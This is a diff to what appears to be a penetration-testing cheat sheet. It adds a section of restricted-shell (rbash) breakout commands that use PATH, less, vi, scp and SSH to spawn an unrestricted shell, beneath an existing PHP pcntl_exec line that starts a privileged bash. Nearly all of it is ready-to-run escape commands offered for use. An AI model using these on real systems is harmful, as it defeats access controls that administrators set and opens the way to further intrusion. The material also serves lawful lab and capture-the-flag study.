@@ -3651,6 +3651,60 @@ export PATH=$(pwd):$PATH
 /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
 ```
 
+#### rbash
+
+##### Breakout using $PATH Variable
+
+```c
+export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+##### Breakouts using less
+
+```c
+less /etc/profile
+!/bin/sh
+```
+
+```c
+VISUAL="/bin/sh -c '/bin/sh'" less /etc/profile
+v
+```
+
+```c
+less /etc/profile
+v:shell
+```
+
+##### Breakout using scp
+
+```c
+TF=$(mktemp)
+echo 'sh 0<&2 1>&2' > $TF
+chmod +x "$TF"
+scp -S $TF x y:
+```
+
+##### Breakouts using vi
+
+```c
+vi -c ':!/bin/sh' /dev/null
+```
+
+```c
+vi
+:set shell=/bin/sh
+:shell
+```
+
+##### Breakouts using SSH Command Execution
+
+```c
+ssh <USERNAME>@<RHOST> -t sh
+ssh <USERNAME>@<RHOST> -t /bin/sh
+ssh <USERNAME>@<RHOST> -t "/bin/bash --no-profile"
+```
+
 ##### relayd
 
 The binary need to have the `SUID` bit set.
